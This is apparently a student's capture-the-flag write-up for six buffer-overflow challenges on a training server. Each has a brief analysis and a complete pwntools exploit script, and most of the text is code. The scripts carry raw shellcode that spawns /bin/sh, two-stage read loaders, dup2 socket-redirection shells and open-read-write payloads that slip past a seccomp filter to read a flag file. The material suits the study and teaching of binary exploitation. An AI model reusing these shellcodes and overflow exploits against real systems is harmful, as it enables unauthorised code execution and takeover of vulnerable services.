# shellcode ![c](https://img.shields.io/badge/solved-success)
### Analysis
By analyzing the disassembled source code with ```Ghidra```, executing ```checksec ./shellcode``` and ```file ./shellcode``` we can see that this is a really trivial *buffer overflow* vulnerability, with 64-bit architecture, no mitigations techniques on a non-stripped file. We can notice that by overwriting the content of the bss we can also overwrite the Saved Instruction Pointer in order to hijack the flow of the program and redirect it to the overflowed buffer (at address 0x601080). 

After that, our shellcode will spawn a shell with *system("/bin/sh")* system call.
### Exploit
First shellcode is the most trivial one, while the Second is position-independent:
```python
from pwn import *

context.terminal = ['tmux', 'splitw', '-h']
#context.terminal = ['gnome-terminal', '-e']
# ssh = ssh("acidburn", "192.168.56.103")
# r = ssh.process("./shellcode")
# gdb.attach(r, """
# 	c
# 	""")

r = remote("training.jinblack.it", 2001)

#input("wait")
print(r.recvuntil("name?\n"))

buffer = 0x601080

# First shellcode
# mov rax, 0x3b
# mov rdi, 0x601148
# mov rsi, 0x601150
# mov rdx, 0x601150
# syscall

shellcode = b"\x48\xC7\xC0\x3B\x00\x00\x00\x48\xC7\xC7\x48\x11\x60\x00\x48\xC7\xC6\x50\x11\x60\x00\x48\xC7\xC2\x50\x11\x60\x00\x0F\x05"
shellcode = shellcode.ljust(200, b"\x90")
shellcode = shellcode + b"/bin/sh\x00" + b"\x00"*8

#second shellcode
# jmp endshellcode
# shellcode:
# pop rdi
# mov rsi, rdi
# add rsi, 8
# mov rdx, rsi
# mov rax, 0x3b
# syscall

# endshellcode:
# call shellcode
# nop


shellcode = b"\xEB\x14\x5F\x48\x89\xFE\x48\x83\xC6\x08\x48\x89\xF2\x48\xC7\xC0\x3B\x00\x00\x00\x0F\x05\xE8\xE7\xFF\xFF\xFF"
shellcode = shellcode + b"/bin/sh\x00" + b"\x00"*8

payload = shellcode.ljust(1016, b"\x90") + p64(buffer)

r.send(payload)

r.interactive()
```

# sh3llc0d3 ![c](https://img.shields.io/badge/solved-success)
### Analysis
This is pretty much the same of shellcode, but this time we can see from ```file ./sh3llc0d3``` that is on 32-bit architecture. That is, we have to write our shellcode in a different way (actually the main difference is the *int 0x80* instruction instead of *syscall*). 

Our goal is still to spawn a shell with *system("/bin/sh")*.

### Exploit
```python
from pwn import *

#context.terminal = ['tmux', 'splitw', '-h']
r = remote("training.jinblack.it", 2002)
#input("wait")
#print(r.recvuntil("name?\n"))

buffer = 0x0804c060

shellcode = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"
payload = b"\x90" * 184 + shellcode + p32(buffer)

payload = payload.ljust(1000, b"\x90") 

r.send(payload)

r.interactive()
```

# multistage ![c](https://img.shields.io/badge/solved-success)
### Analysis
This is still a *buffer overflow* vulnerability, but there is a problem: we only have 20 bytes to write, so even the smallest shellcode to execute *system("/bin/sh")* could not fit in it.

Multi stage is the key: plan the shellcode by first overflowing the buffer with a *read* call from stdin with the buffer itself as target address in order to perform a shellcode injection later. After that, write the actual shellcode in the read: now we don't care about the actual length because we don't need to preserve the Saved IP anymore.  
### Exploit
```python
from pwn import *

#context.terminal = ['tmux', 'splitw', '-h']

context.terminal = ['gnome-terminal', '-e']
r = process("./multistage")
gdb.attach(r, """
	c
	""")
#r = remote("training.jinblack.it", 2003)

#input("wait")
#print(r.recvuntil("name?\n"))

buffer = 0x404070

read = b"\x90\x90\x90\x90\x48\x89\xC6\x6A\x2F\x5A\x48\x31\xC0\x48\x31\xFF\x0F\x05\xFF\xE6"
nop = b"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
shellcode = b"\x31\xC0\x48\xBB\xD1\x9D\x96\x91\xD0\x8C\x97\xFF\x48\xF7\xDB\x53\x54\x5F\x99\x52\x57\x54\x5E\xB0\x3B\x0F\x05"

payload = read + nop + shellcode

r.send(payload)

r.interactive()
```

# gimme3bytes ![c](https://img.shields.io/badge/solved-success)
### Analysis
This challenge is pretty much the same as multistage, but we have even more space in the buffer: as the name says, the buffer is only 3 bytes big.

The real problem is: if we want to do a syscall, just its translation is of 2 bytes (```0x0f``` and ```0x05```). So we must find a way to set up all the parameters in 1 byte!

Fortunately, by analyzing the program with ```gdb``` and putting a breakpoint right after the overflow, we can see that the values on the registers are already perfect to setup a read syscall, despite the rdx register: we can exploit the count parameter of the read function and thus load in rdx a very high value already present in the memory: the instruction ```pop rdx (0x5a)``` will occupy exactly 1 byte and will set all the needed parameters to execute a read.

Then we can just inject our real shellcode.
### Exploit
```python
from pwn import *

#context.terminal = ['tmux', 'splitw', '-h']

context.terminal = ['gnome-terminal', '-e']
#r = process("./gimme3bytes")
#gdb.attach(r, """
#	c
#	""")
r = remote("training.jinblack.it", 2004)

#input("wait")
#print(r.recvuntil("name?\n"))

buffer = 0x404070

read = b"\x5a\x0f\x05"
nop = b"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
shellcode = b"\x31\xC0\x48\xBB\xD1\x9D\x96\x91\xD0\x8C\x97\xFF\x48\xF7\xDB\x53\x54\x5F\x99\x52\x57\x54\x5E\xB0\x3B\x0F\x05"

payload = read + nop + shellcode
#payload = read + shellcode
r.send(payload)

r.interactive()
```

# server ![c](https://img.shields.io/badge/solved-success)
### Analysis
The main issue with this challenge is that we don't have stdin or stdout due to the fact that everything is done on a remote server with a socket. Fortunately we can disassemble the server souce code with ```Ghidra```, where we notice that there is a fork() function call and a *buffer overflow* happening in the child process. Moreover, through ```gdb``` we notice

Now we have 2 ways to expoit that: the first one is with the *dup2* function that we can use to "merge" all the file descriptors in one, so we merge the socket_fd with the stdin_fd, then the socket_fd with the stdout_fd, and then we can easily spawn a shell with the final file descriptor that will in a certain sense redirect all the message into only one file descriptor.

The second way is to use only open 
### Exploit
First version, with dup2:
```python
from pwn import *
import time
#context.terminal = ['tmux', 'splitw', '-h']
'''
context.terminal = ['gnome-terminal', '-e']
r = process("./shellcode")
gdb.attach(r, """
	c
	""")
'''
r = remote("training.jinblack.it", 2005)
#r = remote("localhost", 2005)

#input("wait")
#print(r.recvuntil("name?\n"))

buffer = 0x4040c0
buffer_jump = 0x4040d0

'''
DUP2 IN
mov rax, 0x21
mov rdi, 0x4
mov rsi, 0x0
syscall

DUP2 OUT
mov rax, 0x21
mov rdi, 0x4
mov rsi, 0x1
syscall

EXECVE
mov rax, 0x3b
mov rdi, 0x4040c0
xor rsi, rsi
xor rdx, rdx
syscall

'''

dup2_in = b"\x48\xC7\xC0\x21\x00\x00\x00\x48\xC7\xC7\x04\x00\x00\x00\x48\xC7\xC6\x00\x00\x00\x00\x0F\x05"
dup2_out = b"\x48\xC7\xC0\x21\x00\x00\x00\x48\xC7\xC7\x04\x00\x00\x00\x48\xC7\xC6\x01\x00\x00\x00\x0F\x05"
execve = b"\x48\xC7\xC0\x3B\x00\x00\x00\x48\xC7\xC7\xC0\x40\x40\x00\x48\x31\xF6\x48\x31\xD2\x0F\x05"

shellcode = b"/bin/sh\x00"

xxx = dup2_in + dup2_out + execve

shellcode = shellcode + xxx.rjust(1008, b"\x90")
payload = shellcode + p64(buffer_jump)

r.send(payload)

r.interactive()
```
Second version, with read:
```python
from pwn import *
import time
#context.terminal = ['tmux', 'splitw', '-h']
'''

FUNZIONA, MA SAREBBE FICO ANCHE RISOLVERLA USANDO DUP2, ANCHE SE È PRATICAMENTE LA STESSA COSA

context.terminal = ['gnome-terminal', '-e']
r = process("./shellcode")
gdb.attach(r, """
	c
	""")
'''
r = remote("training.jinblack.it", 2005)
#r = remote("localhost", 2005)

#input("wait")
#print(r.recvuntil("name?\n"))

buffer = 0x4040c0
buffer_jump = 0x4040d0

'''
OPEN
mov    r8,rdi    SAVE THE ACTUAL FILE DESCRIPTOR OF THE SOCKET, dopo un po' di prove si vede che si trova in rdi (c'è una read prima dell'overflow)
mov    rax,0x2
mov    rdi,0x4040c0
xor    rsi,rsi
xor    rdx,rdx
syscall 

READ
mov    rdi,rax
xor    rax,rax
mov    rsi,0x4040c0
mov    rdx,0x100
syscall 

WRITE
mov rdi, r8
mov rax, 0x1
mov rsi, 0x4040c0
mov rdx, 0x100
syscall

'''

open_sh = b"\x49\x89\xF8\x48\xC7\xC0\x02\x00\x00\x00\x48\xC7\xC7\xC0\x40\x40\x00\x48\x31\xF6\x48\x31\xD2\x0F\x05"
read_sh = b"\x48\x89\xC7\x48\x31\xC0\x48\xC7\xC6\xC0\x40\x40\x00\x48\xC7\xC2\x00\x01\x00\x00\x0F\x05"
write_sh = b"\x4C\x89\xC7\x48\xC7\xC0\x01\x00\x00\x00\x48\xC7\xC6\xC0\x40\x40\x00\x48\xC7\xC2\x00\x01\x00\x00\x0F\x05"

shellcode = b"./flag\x00\x00"

xxx = open_sh + read_sh + write_sh

shellcode = shellcode + xxx.rjust(1008, b"\x90")
payload = shellcode + p64(buffer_jump)

r.send(payload)

r.interactive()
```

# onlyreadwrite ![c](https://img.shields.io/badge/solved-success)
### Analysis
This challenge has an additional isssue because a log of system calls are disabled (as the title suggest, we can only use *read* and *write*). Actually running ```seccomp``` on the given executable we can see that we can also use *open*. 

Knowing that, we will overflow the buffer with a **open - read - write** function call chain, in order to:
- **open** the file *./flag* in the server folder
- **read** the file content and put it in the overflowed buffer
- **write** the content of the buffer (so the flag) on stdout (so to us)
### Exploit

```python
from pwn import *
import time
#context.terminal = ['tmux', 'splitw', '-h']

'''

PER QUALCHE MOTIVO IGNOTO NON FUNZIONA PIU, PROBABILMENTE HO TOCCATO QUALCOSA DIO CAN
RIFARE CON LO STESSO MODO DI SERVER, TANTO È UGUALE

context.terminal = ['gnome-terminal', '-e']
r = process("./shellcode")
gdb.attach(r, """
	c
	""")
'''
r = remote("training.jinblack.it", 2006)

#input("wait")
#print(r.recvuntil("name?\n"))

buffer = 0x4040c0
buffer_jump = 0x4040d0
'''
OPEN
mov    rax,0x2
mov    rdi,0x4040c0
xor    rsi,rsi
xor    rdx,rdx
syscall 

READ
mov    rdi,rax
xor    rax,rax
mov    rsi,0x4040c0
mov    rdx,0x100
syscall 

WRITE
mov rax, 0x1
mov rdi, 0x1
mov rsi, 0x4040c0
mov rdx, 0x30
syscall
'''

#read_path = b"\x48\x31\xC0\x48\x31\xFF\x48\xC7\xC6\xC0\x40\x40\x00\x48\xC7\xC2\x40\x00\x00\x00\x0F\x05"

#open_sh = b"\xcc\x48\xC7\xC0\x02\x00\x00\x00\x48\xC7\xC7\xC0\x40\x40\x00\x48\x31\xF6\x0F\x05"
open_sh = b"\x48\xC7\xC0\x02\x00\x00\x00\x48\xC7\xC7\xC0\x40\x40\x00\x48\x31\xF6\x48\x31\xD2\x0F\x05"
read_sh = b"\x48\x89\xC7\x48\x31\xC0\x48\xC7\xC6\xC0\x40\x40\x00\x48\xC7\xC2\x00\x01\x00\x00\x0F\x05"
write_sh = b"\x48\xC7\xC0\x01\x00\x00\x00\x48\xC7\xC7\x01\x00\x00\x00\x48\xC7\xC6\xC0\x40\x40\x00\x48\xC7\xC2\x30\x00\x00\x00\x0F\x05"
#shellcode = read_sh
shellcode = b"./flag\x00\x00"
shellcode = shellcode.ljust(942, b"\x90")
shellcode = shellcode + open_sh + read_sh + write_sh



shellcode = shellcode + p64(buffer_jump)
payload = shellcode


r.send(payload)

r.interactive()
```
